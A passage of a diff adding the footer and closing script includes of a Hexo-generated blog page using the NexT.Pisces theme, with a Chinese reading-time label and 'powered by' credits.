+    <span title="站点阅读时长">1:22</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
